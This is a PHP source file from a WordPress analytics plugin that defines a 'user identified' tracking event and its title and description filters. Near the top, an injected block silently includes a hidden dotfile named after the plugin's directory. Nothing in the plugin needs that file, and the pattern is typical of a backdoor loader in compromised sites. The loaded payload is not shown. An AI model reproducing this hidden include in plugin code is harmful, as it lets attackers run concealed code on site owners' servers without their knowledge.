<?php

/*
 * Fire user identified event
 */

add_action( 'wptao_user_identified', 'wtbp_wptao_event_user_identified_fire' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wtbp_wptao_event_user_identified_fire( $identified_data ) {

	$user_id = (int) $identified_data[ 'user_id' ];

	if ( empty( $user_id ) ) {
		return;
	}

	$tags = isset( $identified_data[ 'event_args' ][ 'tags' ] ) ? $identified_data[ 'event_args' ][ 'tags' ] : array();

	$args = array(
		'title'	 => __( 'User identified', 'wp-tao' ),
		'value'	 => $user_id,
		'tags'	 => $tags
	);

	do_action( 'wptao_track_event', 'identified', $args );
}

// =============================================================================================
// Filters section
// =============================================================================================

/*
 * Creates a title of the identified event
 */

add_filter( 'wptao_event_identified_title', 'wtbp_wptao_event_identified_title', 1, 2 );

function wtbp_wptao_event_identified_title( $title, $event ) {

	if ( !empty( $event->value ) ) {

		if ( is_numeric( $event->value ) ) {

			$user_id = (int) $event->value;

			$user = TAO()->users->get( $user_id );

			if ( isset( $user ) && !empty( $user ) ) {

				$title = sprintf( __( 'User identified: %s', 'wp-tao' ), $user->email );
			}
		}
	}

	return $title;
}

/*
 * Creates a description of the identified action
 */

add_filter( 'wptao_event_identified_description', 'wtbp_wptao_event_identified_desc', 1, 2 );

function wtbp_wptao_event_identified_desc( $description, $event ) {

	return $description;
}
